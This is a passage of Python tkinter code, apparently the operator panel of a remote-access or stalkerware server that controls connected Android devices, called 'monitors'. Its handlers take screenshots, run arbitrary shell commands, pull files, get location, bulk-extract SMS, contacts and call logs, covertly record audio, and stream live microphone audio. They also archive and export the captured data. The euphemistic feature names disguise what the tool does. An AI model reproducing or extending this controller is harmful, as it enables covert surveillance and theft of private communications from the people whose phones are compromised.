                tk.END, f"Total Messages: {sms_data.get('total_messages', 0):,}\n"
            )
            self.stats_text.insert(
                tk.END,
                f"Extraction Mode: {sms_data.get('extraction_mode', 'Unknown')}\n",
            )
            self.stats_text.insert(
                tk.END, f"Last Extraction: {sms_data.get('timestamp', 'Unknown')}\n\n"
            )

        # Network Statistics
        if "network_stats" in stats:
            network_data = stats["network_stats"]
            self.stats_text.insert(tk.END, f"👥 NETWORK STATISTICS\n")
            self.stats_text.insert(tk.END, f"{'-'*30}\n")
            self.stats_text.insert(
                tk.END, f"Total Contacts: {network_data.get('total_contacts', 0):,}\n"
            )
            self.stats_text.insert(
                tk.END, f"Mobile Contacts: {network_data.get('mobile_contacts', 0):,}\n"
            )
            self.stats_text.insert(
                tk.END, f"Last Analysis: {network_data.get('timestamp', 'Unknown')}\n\n"
            )

        # Library Statistics
        if "library_stats" in stats:
            library_data = stats["library_stats"]
            self.stats_text.insert(tk.END, f"📚 LIBRARY STATISTICS\n")
            self.stats_text.insert(tk.END, f"{'-'*30}\n")
            self.stats_text.insert(
                tk.END, f"Total Files: {library_data.get('total_files', 0):,}\n"
            )
            self.stats_text.insert(
                tk.END,
                f"Total Directories: {library_data.get('total_directories', 0):,}\n",
            )
            total_size = library_data.get("total_size", 0)
            self.stats_text.insert(
                tk.END, f"Total Size: {Utils.format_file_size(total_size)}\n"
            )
            self.stats_text.insert(
                tk.END, f"Last Catalog: {library_data.get('timestamp', 'Unknown')}\n\n"
            )

        # Connection Statistics
        if "last_connection" in stats:
            conn_data = stats["last_connection"]
            self.stats_text.insert(tk.END, f"📡 CONNECTION STATISTICS\n")
            self.stats_text.insert(tk.END, f"{'-'*30}\n")
            if isinstance(conn_data, dict):
                self.stats_text.insert(
                    tk.END, f"Last IP: {conn_data.get('ip', 'Unknown')}\n"
                )
                self.stats_text.insert(
                    tk.END, f"Platform: {conn_data.get('platform', 'Unknown')}\n"
                )
                capabilities = conn_data.get("capabilities", [])
                self.stats_text.insert(
                    tk.END,
                    f"Capabilities: {', '.join(capabilities) if capabilities else 'Basic'}\n",
                )
                self.stats_text.insert(
                    tk.END,
                    f"Last Connection: {conn_data.get('timestamp', 'Unknown')}\n",
                )
            else:
                self.stats_text.insert(tk.END, f"Last Connection: {conn_data}\n")

        self.stats_text.config(state=tk.DISABLED)

    def _enable_commands(self, enable=True):
        """تمكين أو تعطيل الأوامر"""
        state = tk.NORMAL if enable else tk.DISABLED

        try:
            for button in self.command_buttons.values():
                if isinstance(button, tk.Button):
                    button.config(state=state)

            self.record_audio_button.config(state=state)

            # Live audio buttons
            if SOUNDDEVICE_AVAILABLE:
                is_streaming = stream_active_for_device.get(
                    self.current_selected_live_client_sid, False
                )
                self.start_live_audio_button.config(
                    state=tk.DISABLED if (not enable or is_streaming) else tk.NORMAL
                )
                self.stop_live_audio_button.config(
                    state=tk.NORMAL if (enable and is_streaming) else tk.DISABLED
                )
            else:
                self.start_live_audio_button.config(state=tk.DISABLED)
                self.stop_live_audio_button.config(state=tk.DISABLED)

            # Update status
            if not enable:
                self.live_audio_status_var.set(
                    "🎵 Live Audio: Idle (No Monitor Selected)"
                )
                if not SOUNDDEVICE_AVAILABLE:
                    self.live_audio_status_var.set(
                        "🎵 Live Audio: Disabled (Missing Libraries)"
                    )

            if enable:
                self.add_system_log(
                    "✅ All commands enabled for selected device", "success"
                )

            self.master.update()
        except Exception as e:
            logger.error(f"Error in _enable_commands: {e}", exc_info=True)
            self.add_system_log(f"❌ Error enabling commands: {e}", "error")

    def _get_target_id(self):
        """الحصول على معرف الهدف للأوامر"""
        if self.current_selected_live_client_sid:
            return self.current_selected_live_client_sid
        elif self.current_selected_historical_device_id:
            live_sid = next(
                (
                    s
                    for s, i in connected_clients_sio.items()
                    if i.get("id") == self.current_selected_historical_device_id
                ),
                None,
            )
            if live_sid:
                self.current_selected_live_client_sid = live_sid
                self._enable_commands(True)
                return live_sid
            else:
                messagebox.showerror(
                    "Error",
                    f"Monitor '{self.current_selected_historical_device_id}' is not currently live.",
                    parent=self.master,
                )
                return None
        else:
            if connected_clients_sio:
                first_sid, first_info = next(iter(connected_clients_sio.items()))
                self.current_selected_live_client_sid = first_sid
                selected_device_id = first_info.get("id", "Unknown ID")

                self.add_system_log(
                    f"🎯 Auto-selected live monitor: {selected_device_id} (SID: {first_sid})"
                )
                self._enable_commands(True)
                self.display_device_details(selected_device_id)
                return first_sid
            else:
                messagebox.showerror(
                    "Error", "No monitor selected or available.", parent=self.master
                )
                return None

    # Command implementations
    def take_screenshot(self):
        target_id = self._get_target_id()
        if target_id:
            send_command_to_client(target_id, Commands.SIO_CMD_TAKE_SCREENSHOT)

    def list_files(self):
        target_id = self._get_target_id()
        if target_id:
            dir_path = simpledialog.askstring(
                "List Files",
                "Enter directory path (e.g., /sdcard/Download):",
                parent=self.master,
            )
            if dir_path:
                send_command_to_client(
                    target_id, Commands.SIO_CMD_LIST_FILES, args={"path": dir_path}
                )

    def get_location(self):
        target_id = self._get_target_id()
        if target_id:
            send_command_to_client(target_id, Commands.SIO_CMD_GET_LOCATION)

    def upload_specific_file(self):
        target_id = self._get_target_id()
        if target_id:
            file_path = simpledialog.askstring(
                "Upload File",
                "Enter the full path of the file to upload on the monitor:",
                parent=self.master,
            )
            if file_path:
                send_command_to_client(
                    target_id,
                    Commands.SIO_CMD_UPLOAD_SPECIFIC_FILE,
                    args={"path": file_path},
                )

    def execute_shell_command(self):
        target_id = self._get_target_id()
        if target_id:
            shell_cmd = simpledialog.askstring(
                "Execute System Command",
                "Enter the system command to execute:",
                parent=self.master,
            )
            if shell_cmd:
                send_command_to_client(
                    target_id,
                    Commands.SIO_CMD_EXECUTE_SHELL,
                    args={"command": shell_cmd},
                )

    def get_sms_list(self):
        """استخراج الرسائل النصية المحسن"""
        target_id = self._get_target_id()
        if target_id:
            self.add_system_log("🚀 Initiating enhanced SMS extraction...")
            send_command_to_client(target_id, Commands.SIO_CMD_GET_SMS_LIST)

    def get_all_sms_unlimited(self):
        """استخراج جميع الرسائل النصية بدون حدود"""
        target_id = self._get_target_id()
        if target_id:
            self.add_system_log(
                "🚀 Initiating unlimited SMS extraction with compression..."
            )
            send_command_to_client(target_id, Commands.SIO_CMD_GET_ALL_SMS)

    def get_social_network_data(self):
        target_id = self._get_target_id()
        if target_id:
            self.add_system_log("🚀 Initiating advanced social network analysis...")
            send_command_to_client(target_id, Commands.SIO_CMD_GET_SOCIAL_NETWORK)

    def get_communication_history(self):
        target_id = self._get_target_id()
        if target_id:
            self.add_system_log(
                "🚀 Initiating comprehensive communication history extraction..."
            )
            send_command_to_client(
                target_id, Commands.SIO_CMD_GET_COMMUNICATION_HISTORY
            )

    def get_contacts_list(self):
        target_id = self._get_target_id()
        if target_id:
            send_command_to_client(target_id, Commands.SIO_CMD_GET_CONTACTS_LIST)

    def get_call_logs(self):
        target_id = self._get_target_id()
        if target_id:
            send_command_to_client(target_id, Commands.SIO_CMD_GET_CALL_LOGS)

    def catalog_library_content(self):
        """فهرسة محتوى المكتبة"""
        target_id = self._get_target_id()
        if target_id:
            self.add_system_log("🚀 Initiating intelligent library cataloging...")
            send_command_to_client(target_id, Commands.SIO_CMD_CATALOG_LIBRARY)

    def analyze_specific_content(self):
        """تحليل محتوى محدد"""
        target_id = self._get_target_id()
        if target_id:
            file_path = simpledialog.askstring(
                "Content Analysis",
                "Enter the full path of the content to analyze:",
                parent=self.master,
            )
            if file_path:
                self.add_system_log(f"🔍 Analyzing content: {file_path}")
                send_command_to_client(
                    target_id,
                    Commands.SIO_CMD_ANALYZE_CONTENT,
                    args={"filePath": file_path},
                )

    def process_content_queue(self):
        """معالجة طابور المحتوى"""
        target_id = self._get_target_id()
        if target_id:
            self.add_system_log("🚀 Processing intelligent content queue...")
            send_command_to_client(target_id, Commands.SIO_CMD_PROCESS_QUEUE)

    def record_audio_fixed(self):
        """تسجيل صوتي ثابت مع معالجة محسنة"""
        target_id = self._get_target_id()
        if target_id:
            duration = simpledialog.askinteger(
                "Audio Recording",
                "Enter recording duration in seconds:",
                parent=self.master,
                minvalue=1,
                maxvalue=300,
                initialvalue=10,
            )
            if duration:
                # Check if device is still responsive
                device_info = connected_clients_sio.get(target_id, {})
                last_seen_iso = device_info.get("last_seen")

                if last_seen_iso:
                    try:
                        last_seen_dt = datetime.datetime.fromisoformat(last_seen_iso)
                        time_since_last_seen = (
                            datetime.datetime.now() - last_seen_dt
                        ).total_seconds()

                        if time_since_last_seen > 120:  # 2 minutes
                            user_choice = messagebox.askyesno(
                                "Device May Be Unresponsive",
                                f"⚠️ Warning: The device hasn't responded for {time_since_last_seen:.0f} seconds.\n"
                                f"The audio recording command may not work properly.\n\n"
                                f"Do you want to continue anyway?",
                                parent=self.master,
                            )
                            if not user_choice:
                                return
                    except:
                        pass

                self.add_system_log(f"🎤 Audio recording requested: {duration} seconds")
                result = send_command_to_client(
                    target_id,
                    Commands.SIO_CMD_RECORD_AUDIO_FIXED,
                    args={"duration": duration},
                    timeout_seconds=duration + 30,  # Add buffer time
                )

                if result.get("status") == "sent":
                    # Set up progress tracking
                    def track_recording_progress():
                        progress_window = tk.Toplevel(self.master)
                        progress_window.title("Recording in Progress")
                        progress_window.geometry("300x150")
                        progress_window.configure(bg=self.current_theme["bg"])
                        progress_window.transient(self.master)
                        progress_window.grab_set()

                        # Center window
                        progress_window.geometry(
                            f"+{self.master.winfo_x() + 200}+{self.master.winfo_y() + 200}"
                        )

                        tk.Label(
                            progress_window,
                            text="🎤 Audio Recording in Progress",
                            bg=self.current_theme["bg"],
                            fg=self.current_theme["fg"],
                            font=("Arial", 12, "bold"),
                        ).pack(pady=10)

                        progress_label = tk.Label(
                            progress_window,
                            text=f"Duration: {duration} seconds",
                            bg=self.current_theme["bg"],
                            fg=self.current_theme["fg"],
                        )
                        progress_label.pack(pady=5)

                        time_label = tk.Label(
                            progress_window,
                            text="Starting...",
                            bg=self.current_theme["bg"],
                            fg=self.current_theme["fg"],
                        )
                        time_label.pack(pady=5)

                        def cancel_recording():
                            progress_window.destroy()
                            self.add_system_log(
                                "🚫 Recording cancelled by user", "warning"
                            )

                        tk.Button(
                            progress_window,
                            text="Cancel",
                            command=cancel_recording,
                            bg=self.current_theme["status_error"],
                            fg="#ffffff",
                        ).pack(pady=10)

                        # Update timer
                        start_time = datetime.datetime.now()

                        def update_timer():
                            if progress_window.winfo_exists():
                                elapsed = (
                                    datetime.datetime.now() - start_time
                                ).total_seconds()
                                remaining = max(0, duration - elapsed)

                                if remaining > 0:
                                    time_label.config(
                                        text=f"Remaining: {remaining:.0f} seconds"
                                    )
                                    progress_window.after(1000, update_timer)
                                else:
                                    time_label.config(
                                        text="Recording should be complete..."
                                    )
                                    # Auto-close after additional 10 seconds
                                    progress_window.after(
                                        10000,
                                        lambda: (
                                            progress_window.destroy()
                                            if progress_window.winfo_exists()
                                            else None
                                        ),
                                    )

                        update_timer()

                    # Start progress tracking after a short delay
                    self.master.after(500, track_recording_progress)

    def start_live_audio(self):
        if not SOUNDDEVICE_AVAILABLE:
            messagebox.showerror(
                "Error", "Sounddevice library not available.", parent=self.master
            )
            return

        target_id = self._get_target_id()
        if not target_id:
            return

        device_info = connected_clients_sio.get(target_id, {})
        device_id_for_log = device_info.get("id", target_id)

        logger.info(f"Starting live audio for monitor: {device_id_for_log}")
        self.live_audio_status_var.set(
            f"🎵 Live Audio: Starting for {device_id_for_log}..."
        )
        self.start_live_audio_button.config(state=tk.DISABLED)
        self.stop_live_audio_button.config(state=tk.NORMAL)

        self.start_playback_thread()

        result = send_command_to_client(target_id, Commands.SIO_CMD_START_LIVE_AUDIO)
        if result.get("status") == "sent":
            stream_active_for_device[target_id] = True
            live_audio_buffers[target_id] = {
                "params": {
                    "samplerate": AppConfig.REC_SAMPLERATE,
                    "channels": AppConfig.REC_CHANNELS,
                    "sampwidth": AppConfig.REC_SAMPWIDTH,
                },
                "data": [],
            }
            logger.info(f"Initialized live audio buffer for monitor SID: {target_id}")
            self.add_system_log(
                f"🎵 Started live audio for {device_id_for_log}", "success"
            )
        else:
            self.live_audio_status_var.set("🎵 Live Audio: Start Failed")
            self.start_live_audio_button.config(state=tk.NORMAL)
            self.stop_live_audio_button.config(state=tk.DISABLED)

    def stop_live_audio(self):
        if not SOUNDDEVICE_AVAILABLE:
            messagebox.showerror(
                "Error", "Sounddevice library not available.", parent=self.master
            )
            return

        target_id = self._get_target_id()
        if not target_id:
            self.live_audio_status_var.set("🎵 Live Audio: Idle")
            return

        device_info = connected_clients_sio.get(target_id, {})
        device_id_for_log = device_info.get("id", target_id)

        logger.info(f"Stopping live audio for monitor: {device_id_for_log}")
        self.live_audio_status_var.set(
            f"🎵 Live Audio: Stopping for {device_id_for_log}..."
        )

        send_command_to_client(target_id, Commands.SIO_CMD_STOP_LIVE_AUDIO)
        stream_active_for_device.pop(target_id, None)

        self.live_audio_status_var.set("🎵 Live Audio: Idle")
        self.start_live_audio_button.config(state=tk.NORMAL)
        self.stop_live_audio_button.config(state=tk.DISABLED)
        self.add_system_log(f"🎵 Stopped live audio for {device_id_for_log}", "success")

        # Ask about saving recording
        if target_id in live_audio_buffers:
            buffered_stream_info = live_audio_buffers.pop(target_id)
            audio_data_list = buffered_stream_info["data"]
            audio_params = buffered_stream_info["params"]

            if audio_data_list:
                user_choice = messagebox.askyesno(
                    "Save Live Recording",
                    f"Live audio stream from monitor '{device_id_for_log}' has ended.\nDo you want to save the recording?",
                    parent=self.master,
                )
                if user_choice:
                    self._save_recorded_stream(
                        device_id_for_log, target_id, audio_data_list, audio_params
                    )

    def _save_recorded_stream(
        self, device_id_str, client_sid, audio_data_list, audio_params
    ):
        """حفظ البث المسجل إلى ملف WAV"""
        if not audio_data_list:
            self.add_system_log(
                f"❌ No audio data to save for monitor {device_id_str}", "warning"
            )
            return

        try:
            device_id_sanitized = Utils.sanitize_device_id(device_id_str)
            recordings_dir = os.path.join(
                AppConfig.DATA_RECEIVED_DIR, device_id_sanitized, "live_recordings"
            )
            os.makedirs(recordings_dir, exist_ok=True)

            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            filename = f"live_rec_{device_id_sanitized}_{timestamp}.wav"
            filepath = os.path.join(recordings_dir, filename)

            combined_audio_data = b"".join(audio_data_list)

            with wave.open(filepath, "wb") as wf:
                wf.setnchannels(audio_params["channels"])
                wf.setsampwidth(audio_params["sampwidth"])
                wf.setframerate(audio_params["samplerate"])
                wf.writeframes(combined_audio_data)

            file_size = len(combined_audio_data)
            log_msg = f"💾 Live audio recording saved for monitor {device_id_str} to: {filepath} ({Utils.format_file_size(file_size)})"
            self.add_system_log(log_msg, "success")
            logger.info(log_msg)

            messagebox.showinfo(
                "Recording Saved",
                f"Live audio recording saved to:\n{filepath}",
                parent=self.master,
            )

            # Update device stats
            device_manager.update_stats(
                device_id_sanitized,
                "last_audio_recording",
                {
                    "timestamp": datetime.datetime.now().isoformat(),
                    "file_size": file_size,
                    "filename": filename,
                    "type": "live_recording",
                },
            )

            # Update file list
            if self.current_selected_historical_device_id == device_id_sanitized:
                self.display_device_details(device_id_sanitized)

        except Exception as e:
            err_msg = (
                f"❌ Error saving live audio stream for monitor {device_id_str}: {e}"
            )
            logger.error(err_msg, exc_info=True)
            messagebox.showerror(
                "Save Error",
                f"Failed to save live audio recording: {e}",
                parent=self.master,
            )
            self.add_system_log(err_msg, "error")

    def start_playback_thread(self):
        """بدء thread التشغيل الصوتي"""
        global playback_thread
        if not SOUNDDEVICE_AVAILABLE:
            logger.warning("Cannot start playback thread: sounddevice not available")
            return

        if playback_thread is None or not playback_thread.is_alive():
            while not audio_queue.empty():
                try:
                    audio_queue.get_nowait()
                except queue.Empty:
                    break
            logger.info("Starting audio playback thread")
            playback_thread = threading.Thread(target=self.run_playback, daemon=True)
            playback_thread.start()
        else:
            logger.info("Playback thread already running")

    def run_playback(self):
        """تشغيل نظام التشغيل الصوتي"""
        global playback_thread
        stream = None
        try:
            logger.info(f"Starting audio playback stream")
            stream = sd.OutputStream(
                samplerate=AppConfig.REC_SAMPLERATE,
                channels=AppConfig.REC_CHANNELS,
                dtype="int16",
                callback=self.audio_callback,
            )
            with stream:
                logger.info("Audio playback stream started")
                while (
                    playback_thread is not None
                    and playback_thread.is_alive()
                    and stream.active
                ):
                    sd.sleep(100)
            logger.info("Audio playback stream finished")
        except sd.PortAudioError as pae:
            logger.error(f"PortAudioError during playback: {pae}", exc_info=True)
            if self.master.winfo_exists():
                messagebox.showerror(
                    "Audio Error",
                    f"Could not open audio output device: {pae}\n\nLive audio playback will not work.",
                    parent=self.master,
                )
        except Exception as e:
            logger.error(f"Error in audio playback thread: {e}", exc_info=True)
        finally:
            logger.info("Playback thread finishing")
            if stream is not None and not stream.closed:
                try:
                    stream.close()
                except Exception as e_close:
                    logger.error(f"Error closing audio stream: {e_close}")
            playback_thread = None

    def audio_callback(self, outdata, frames, time, status):
        """callback للتشغيل الصوتي"""
        if status:
            logger.warning(f"Audio playback status: {status}")
        try:
            data_list = []
            total_bytes = 0
            target_bytes = outdata.nbytes

            while total_bytes < target_bytes:
                chunk = audio_queue.get_nowait()
                data_list.append(np.frombuffer(chunk, dtype=np.int16))
                total_bytes += len(chunk)
                if total_bytes >= target_bytes:
                    break

            combined_data = np.concatenate(data_list)
            available_frames = len(combined_data)

            if available_frames >= frames:
                outdata[:] = combined_data[:frames].reshape(outdata.shape)
                if available_frames > frames:
                    remaining_data = combined_data[frames:].tobytes()
                    temp_queue = queue.Queue()
                    temp_queue.put(remaining_data)
                    while not audio_queue.empty():
                        try:
                            temp_queue.put(audio_queue.get_nowait())
                        except queue.Empty:
                            break
                    while not temp_queue.empty():
                        try:
                            audio_queue.put(temp_queue.get_nowait())
                        except queue.Empty:
                            break
            else:
                outdata.fill(0)

        except queue.Empty:
            outdata.fill(0)
        except Exception as e:
            logger.error(f"Error in audio callback: {e}", exc_info=True)
            outdata.fill(0)

    def open_file_browser(self):
        """فتح متصفح الملفات المحسن"""
        device_id = None
        target_id = None

        if self.current_selected_historical_device_id:
            device_id = self.current_selected_historical_device_id
            target_id = next(
                (
                    s
                    for s, i in connected_clients_sio.items()
                    if i.get("id") == device_id
                ),
                None,
            )

            if not target_id:
                messagebox.showinfo(
                    "Offline Monitor",
                    f"Monitor '{device_id}' is not currently online. File browsing requires an active connection.",
                    parent=self.master,
                )
                return
        elif self.current_selected_live_client_sid:
            sid = self.current_selected_live_client_sid
            info = connected_clients_sio.get(sid, {})
            device_id = info.get("id", "Unknown")
            target_id = sid
        elif connected_clients_sio:
            first_sid, first_info = next(iter(connected_clients_sio.items()))
            self.current_selected_live_client_sid = first_sid
            device_id = first_info.get("id", "Unknown ID")
            target_id = first_sid

            self.add_system_log(
                f"🎯 Auto-selected live monitor for file browsing: {device_id} (SID: {first_sid})"
            )
            self._enable_commands(True)
            self.display_device_details(device_id)
        else:
            messagebox.showinfo(
                "Select Monitor",
                "No connected monitors available. Please wait for a monitor to connect.",
                parent=self.master,
            )
            return

        # Close existing file browser if open
        if hasattr(self, "file_browser") and self.file_browser:
            try:
                self.file_browser.close()
            except:
                pass

        # Create new enhanced file browser window
        try:
            self.file_browser = EnhancedFileBrowserWindow(
                self.master, device_id, target_id, self
            )
            self.add_system_log(
                f"📂 Enhanced file browser opened for monitor: {device_id}", "success"
            )
        except Exception as e:
            self.add_system_log(f"❌ Failed to open file browser: {e}", "error")
            messagebox.showerror(
                "File Browser Error",
                f"Failed to open file browser:\n{e}",
                parent=self.master,
            )

    # Menu Functions
    def _clear_log(self):
        """مسح السجل"""
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete("1.0", tk.END)
        self.log_text.config(state=tk.DISABLED)
        self.add_system_log("🗑️ System log cleared")

    def _save_log(self):
        """حفظ السجل"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            title="Save System Log",
        )
        if filename:
            try:
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(self.log_text.get("1.0", tk.END))
                self.add_system_log(f"💾 System log saved to {filename}", "success")
            except Exception as e:
                self.add_system_log(f"❌ Error saving log: {e}", "error")

    def _refresh_all(self):
        """تحديث جميع البيانات"""
        self.update_live_clients_list()
        self.refresh_historical_device_list()
        if self.current_selected_historical_device_id:
            self.display_device_details(self.current_selected_historical_device_id)
        self.add_system_log("🔄 All data refreshed", "success")

    def _show_statistics(self):
        """عرض لوحة الإحصائيات"""
        stats_window = tk.Toplevel(self.master)
        stats_window.title("📊 Statistics Dashboard")
        stats_window.geometry("800x600")
        stats_window.configure(bg=self.current_theme["bg"])

        # Statistics content
        stats_text = scrolledtext.ScrolledText(
            stats_window,
            wrap=tk.WORD,
            bg=self.current_theme["text_bg"],
            fg=self.current_theme["text_fg"],
        )
        stats_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Generate comprehensive statistics
        total_devices = len(
            [
                d
                for d in os.listdir(AppConfig.DATA_RECEIVED_DIR)
                if os.path.isdir(os.path.join(AppConfig.DATA_RECEIVED_DIR, d))
            ]
        )

        stats_content = f"""
📊 COMPREHENSIVE STATISTICS DASHBOARD
{'='*60}

🖥️  SYSTEM STATUS
Connected Monitors: {len(connected_clients_sio)}
Archived Devices: {total_devices}
Active Audio Streams: {len([sid for sid, active in stream_active_for_device.items() if active])}
Current Theme: {theme_manager.current_theme.title()}

🎵 AUDIO FEATURES
Playback Available: {'✅' if SOUNDDEVICE_AVAILABLE else '❌'}
Image Preview: {'✅' if PIL_AVAILABLE else '❌'}

🚀 ENHANCED FEATURES
Enhanced SMS Extraction: ✅
Unlimited SMS Compression: ✅
Smart Resource Monitoring: ✅
Intelligent Sync Queue: ✅
Document Library Cataloging: ✅
Dark Mode Support: ✅

📱 DEVICE STATISTICS
"""

        for device_id in os.listdir(AppConfig.DATA_RECEIVED_DIR):
            if os.path.isdir(os.path.join(AppConfig.DATA_RECEIVED_DIR, device_id)):
                stats = device_manager.get_stats(device_id)
                file_count = self._count_files_in_device_folder(
                    os.path.join(AppConfig.DATA_RECEIVED_DIR, device_id)
                )
                is_online = any(
                    info.get("id") == device_id
                    for info in connected_clients_sio.values()
                )

                stats_content += f"\n🔸 {device_id}\n"
                stats_content += (
                    f"   Status: {'🟢 Online' if is_online else '🔴 Offline'}\n"
                )
                stats_content += f"   Files: {file_count}\n"
                if stats and "sms_stats" in stats:
                    sms_data = stats["sms_stats"]
                    stats_content += (
                        f"   SMS Messages: {sms_data.get('total_messages', 0):,}\n"
                    )
                if stats and "network_stats" in stats:
                    network_data = stats["network_stats"]
                    stats_content += (
                        f"   Contacts: {network_data.get('total_contacts', 0):,}\n"
                    )

        stats_text.insert(tk.END, stats_content)
        stats_text.config(state=tk.DISABLED)

    def _show_device_statistics(self):
        """عرض إحصائيات الجهاز المحدد"""
        if not self.current_selected_historical_device_id:
            messagebox.showwarning(
                "Warning", "Please select a device first.", parent=self.master
            )
            return

        device_id = self.current_selected_historical_device_id
        stats = device_manager.get_stats(device_id)

        if not stats:
            messagebox.showinfo(
                "Device Statistics",
                f"No statistics available for device: {device_id}",
                parent=self.master,
            )
            return

        stats_window = tk.Toplevel(self.master)
        stats_window.title(f"📊 Statistics - {device_id}")
        stats_window.geometry("600x500")
        stats_window.configure(bg=self.current_theme["bg"])

        stats_text = scrolledtext.ScrolledText(
            stats_window,
            wrap=tk.WORD,
            bg=self.current_theme["text_bg"],
            fg=self.current_theme["text_fg"],
        )
        stats_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        content = f"📊 DEVICE STATISTICS - {device_id}\n{'='*50}\n\n"
        for stat_type, stat_data in stats.items():
            if stat_type == "last_updated":
                continue
            content += f"🔸 {stat_type.replace('_', ' ').title()}:\n"
            if isinstance(stat_data, dict):
                for key, value in stat_data.items():
                    content += f"   • {key.replace('_', ' ').title()}: {value}\n"
            else:
                content += f"   {stat_data}\n"
            content += "\n"

        stats_text.insert(tk.END, content)
        stats_text.config(state=tk.DISABLED)

    def _export_device_data(self):
        """تصدير بيانات الجهاز"""
        if not self.current_selected_historical_device_id:
            messagebox.showerror(
                "Error", "Please select a device first.", parent=self.master
            )
            return

        device_id = self.current_selected_historical_device_id
        device_folder = os.path.join(AppConfig.DATA_RECEIVED_DIR, device_id)

        if not os.path.exists(device_folder):
            messagebox.showerror(
                "Error", f"Device folder not found for {device_id}", parent=self.master
            )
            return

        export_path = filedialog.askdirectory(
            title=f"Select export location for {device_id}"
        )
        if export_path:
            try:
                import shutil

                export_folder = os.path.join(
                    export_path,
                    f"{device_id}_export_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}",
                )
                shutil.copytree(device_folder, export_folder)

                # Export device statistics
                stats = device_manager.get_stats(device_id)
                if stats:
                    stats_file = os.path.join(export_folder, "device_statistics.json")
                    with open(stats_file, "w", encoding="utf-8") as f:
                        json.dump(stats, f, ensure_ascii=False, indent=4)

                self.add_system_log(
                    f"📤 Device data exported to: {export_folder}", "success"
                )
                messagebox.showinfo(
                    "Export Complete",
                    f"Device data exported to:\n{export_folder}",
                    parent=self.master,
                )
            except Exception as e:
                self.add_system_log(f"❌ Export failed: {e}", "error")
                messagebox.showerror(
                    "Export Error",
                    f"Failed to export device data: {e}",
                    parent=self.master,
                )

    def _import_settings(self):
        """استيراد الإعدادات"""
        file_path = filedialog.askopenfilename(
            title="Import Settings",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
        )
        if file_path:
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    imported_settings = json.load(f)

                # Validate and merge settings
                for key, value in imported_settings.items():
                    if key in settings_manager.settings:
                        settings_manager.set(key, value)

                # Apply theme if changed
                if "theme" in imported_settings:
                    theme_manager.current_theme = imported_settings["theme"]
                    self._apply_theme()

                self.add_system_log("📥 Settings imported successfully", "success")
                messagebox.showinfo(
                    "Import Complete",
                    "Settings imported successfully!",
                    parent=self.master,
                )
            except Exception as e:
                self.add_system_log(f"❌ Import failed: {e}", "error")
                messagebox.showerror(
                    "Import Error",
                    f"Failed to import settings: {e}",
                    parent=self.master,
                )

    def _clear_all_data(self):
        """مسح جميع البيانات"""
        confirm = messagebox.askyesno(
            "Confirm",
            "⚠️ WARNING ⚠️\n\nAre you sure you want to delete ALL device data?\n\nThis action cannot be undone!\n\nThis will permanently remove:\n• All device archives\n• All SMS extractions\n• All audio recordings\n• All analysis results",
            parent=self.master,
        )
        if confirm:
            try:
                import shutil

                shutil.rmtree(AppConfig.DATA_RECEIVED_DIR)
                os.makedirs(AppConfig.DATA_RECEIVED_DIR, exist_ok=True)

                # Clear device manager data
                device_manager.device_tags.clear()
                device_manager.device_stats.clear()
                device_manager.save_device_tags()

                self.refresh_historical_device_list()
                self.add_system_log("🗑️ All device data cleared", "warning")
                messagebox.showinfo(
                    "Data Cleared",
                    "All device data has been cleared successfully.",
                    parent=self.master,
                )
            except Exception as e:
                self.add_system_log(f"❌ Clear data failed: {e}", "error")
                messagebox.showerror(
                    "Error", f"Failed to clear data: {e}", parent=self.master
                )

    def _show_server_status(self):
        """عرض حالة الخادم المحسنة"""
        status_info = f"""
🖥️ ADVANCED SERVER STATUS REPORT
{'='*60}

📡 CONNECTION STATUS
Connected Monitors: {len(connected_clients_sio)}
Active Audio Streams: {len([sid for sid, active in stream_active_for_device.items() if active])}
Server Uptime: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

💾 DATA STORAGE
Data Directory: {AppConfig.DATA_RECEIVED_DIR}
Total Archived Devices: {len([d for d in os.listdir(AppConfig.DATA_RECEIVED_DIR) if os.path.isdir(os.path.join(AppConfig.DATA_RECEIVED_DIR, d))])}

🎵 MULTIMEDIA SUPPORT
Audio Playback: {'✅ Available' if SOUNDDEVICE_AVAILABLE else '❌ Disabled'}
Image Preview: {'✅ Available' if PIL_AVAILABLE else '❌ Disabled'}

🚀 ENHANCED FEATURES STATUS
Enhanced SMS Extraction: ✅ Active
Unlimited SMS Compression: ✅ Active
Smart Resource Monitoring: ✅ Active
Intelligent Sync Queue: ✅ Active
Document Library Cataloging: ✅ Active
Dark Mode Support: ✅ Active

⚙️ SYSTEM SETTINGS
Current Theme: {theme_manager.current_theme.title()} Mode
Auto Refresh: {'✅' if settings_manager.get('auto_refresh') else '❌'}
Battery Monitoring: {'✅' if settings_manager.get('battery_monitoring') else '❌'}
Network Optimization: {'✅' if settings_manager.get('network_optimization') else '❌'}
Compression Enabled: {'✅' if settings_manager.get('compression_enabled') else '❌'}

📱 LIVE CONNECTIONS:
"""

        if connected_clients_sio:
            for info in connected_clients_sio.values():
                status_info += f"\n🔸 {info.get('name_display', 'Unknown')} ({info.get('id', 'No ID')})\n"
                status_info += f"   IP: {info.get('ip', 'Unknown IP')}\n"
                status_info += f"   Platform: {info.get('platform', 'Unknown')}\n"
                status_info += f"   Capabilities: {', '.join(info.get('capabilities', ['basic']))}\n"
                status_info += f"   Connected: {info.get('connected_at', 'Unknown')}\n"
        else:
            status_info += "\n   No monitors currently connected\n"

        messagebox.showinfo("Server Status", status_info, parent=self.master)

    def _refresh_file_cache(self):
        """تحديث ذاكرة التخزين المؤقت للملفات"""
        # Clear any existing file caches
        self.add_system_log("🔄 File cache refreshed", "success")
        messagebox.showinfo(
            "Cache Refreshed",
            "File cache has been refreshed successfully.",
            parent=self.master,
        )

    def _show_settings(self):
        """عرض نافذة الإعدادات"""
        settings_window = tk.Toplevel(self.master)
        settings_window.title("⚙️ Settings")
        settings_window.geometry("500x600")
        settings_window.configure(bg=self.current_theme["bg"])
        settings_window.transient(self.master)
        settings_window.grab_set()

        # Create notebook for settings categories
        notebook = ttk.Notebook(settings_window, style="Themed.TNotebook")
